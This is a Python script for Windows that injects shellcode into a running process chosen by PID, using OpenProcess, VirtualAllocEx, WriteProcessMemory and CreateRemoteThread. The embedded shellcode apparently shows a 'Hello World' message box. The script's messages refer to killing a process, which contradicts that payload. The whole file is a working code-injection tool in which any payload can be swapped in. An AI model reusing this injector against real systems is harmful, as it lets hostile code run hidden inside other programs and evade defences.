import sys
from ctypes import *

PAGE_EXECUTE_READWRITE         = 0x00000040
PROCESS_ALL_ACCESS =     ( 0x000F0000 | 0x00100000 | 0xFFF )
VIRTUAL_MEM        =     ( 0x1000 | 0x2000 )

kernel32      = windll.kernel32
pid           = int(sys.argv[1])

if not sys.argv[1]:
    print "Code Injector: ./code_injector.py <PID to inject> <PID to Kill>"
    sys.exit(0)

shellcode = \
"\xE8\x00\x00\x00\x00\x5F\x81\xEF\x1E\x10\x40\x00\x8D\x87\x94\x10"\
"\x40\x00\x50\xE8\x83\x00\x00\x00\x8D\x87\xA5\x10\x40\x00\x50\xE8"\
"\x77\x00\x00\x00\x2B\xC0\x50\x8D\x9F\x83\x10\x40\x00\x53\x8D\x9F"\
"\x5E\x10\x40\x00\x53\x50\xFF\x97\xAC\x10\x40\x00\x6A\x00\xFF\x97"\
"\x9D\x10\x40\x00\xC3\x5B\x2A\x5D\x20\x48\x65\x6C\x6C\x6F\x20\x57"\
"\x6F\x72\x6C\x64\x20\x43\x6F\x64\x65\x72\x21\x20\x28\x43\x29\x20"\
"\x41\x6E\x73\x6B\x79\x61\x2E\x0D\x0A\x00\x4D\x73\x67\x42\x6F\x78"\
"\x20\x42\x79\x20\x41\x6E\x73\x6B\x79\x61\x00\x6B\x65\x72\x6E\x65"\
"\x6C\x33\x32\x00\x01\x92\x8F\x05\x00\x00\x00\x00\x75\x73\x65\x72"\
"\x33\x32\x00\xF7\x6C\x55\xD8\x00\x00\x00\x00\x60\x8B\x74\x24\x24"\
"\xE8\x97\x00\x00\x00\x68\xAD\xD1\x34\x41\x50\xE8\x1F\x00\x00\x00"\
"\x56\xFF\xD0\x8B\xD8\x2B\xC0\xAC\x84\xC0\x75\xFB\x8B\xFE\xAD\x85"\
"\xC0\x74\x0A\x50\x53\xE8\x05\x00\x00\x00\xAB\xEB\xF1\x61\xC3\x60"\
"\x8B\x5C\x24\x24\x8B\x74\x24\x28\x2B\xED\x8B\xD3\x03\x52\x3C\x8B"\
"\x52\x78\x03\xD3\x8B\x42\x18\x8B\x7A\x1C\x03\xFB\x8B\x7A\x20\x03"\
"\xFB\x52\x8B\xD7\x8B\x17\x03\xD3\x45\x60\x8B\xF2\x2B\xC9\xAC\x41"\
"\x84\xC0\x75\xFA\x89\x4C\x24\x18\x61\x60\x2B\xC0\xE8\x51\x00\x00"\
"\x00\x3B\xC6\x61\x74\x08\x83\xC7\x04\x48\x74\x18\xEB\xD6\x5A\x4D"\
"\x8B\x4A\x24\x03\xCB\x0F\xB7\x04\x69\x8B\x6A\x1C\x03\xEB\x8B\x44"\
"\x85\x00\x03\xC3\x89\x44\x24\x1C\x61\xC2\x08\x00\x60\x2B\xC0\x64"\
"\x8B\x40\x30\x85\xC0\x78\x0C\x8B\x40\x0C\x8B\x70\x1C\xAD\x8B\x40"\
"\x08\xEB\x09\x8B\x40\x34\x8D\x40\x7C\x8B\x40\x3C\x89\x44\x24\x1C"\
"\x61\xC3\x60\xE3\x18\xF7\xD0\x32\x02\x42\xB3\x08\xD1\xE8\x73\x05"\
"\x35\x20\x83\xB8\xED\xFE\xCB\x75\xF3\xE2\xEC\xF7\xD0\x89\x44\x24"\
"\x1C\x61\xC3\x00"

code_size     = len(shellcode)

# Get a handle to the process we are injecting into.
h_process=kernel32.OpenProcess( PROCESS_ALL_ACCESS, False, int(pid) )

if not h_process:

    print "[*] Couldn't acquire a handle to PID: %s" % pid
    sys.exit(0)

# Allocate some space for the shellcode
arg_address=kernel32.VirtualAllocEx( h_process, 0, code_size, VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)
print arg_address

# Write out the shellcode
written = c_int(0)
s=kernel32.WriteProcessMemory(h_process, arg_address, shellcode, code_size, byref(written))
print s

# Now we create the remote thread and point it's entry routine
# to be head of our shellcode

thread_id = c_ulong(0)
if not kernel32.CreateRemoteThread(h_process,None,0,arg_address,None,0,byref(thread_id)):

    print "[*] Failed to inject process-killing shellcode. Exiting."
    sys.exit(0)

print "[*] Remote thread successfully created with a thread ID of: 0x%08x" % thread_id.value